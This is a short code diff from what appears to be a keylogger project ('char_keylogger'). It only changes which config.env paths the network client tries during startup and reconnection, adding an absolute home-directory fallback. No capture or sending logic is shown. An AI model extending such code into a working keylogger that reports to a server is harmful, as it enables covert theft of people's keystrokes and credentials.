@@ -129,8 +129,8 @@ static bool try_reconnect(void) {
     network_client_cleanup();
     
     // Try to initialize network client
-    if (network_client_init("config.env") < 0) {
-        if (network_client_init("user/config.env") < 0) {
+    if (network_client_init("user/config.env") < 0) {
+        if (network_client_init("/home/duy/char_keylogger/user/config.env") < 0) {
             printf("Failed to reconnect to server\n");
             return false;
         }
@@ -153,8 +153,8 @@ int main(void) {
     }
 
     // Initialize network client
-    if (network_client_init("config.env") < 0) {
-        if (network_client_init("user/config.env") < 0) {
+    if (network_client_init("user/config.env") < 0) {
+        if (network_client_init("/home/duy/char_keylogger/user/config.env") < 0) {
             fprintf(stderr, "Failed to initialize network client\n");
             // Continue without network - log locally only
             network_connected = false;
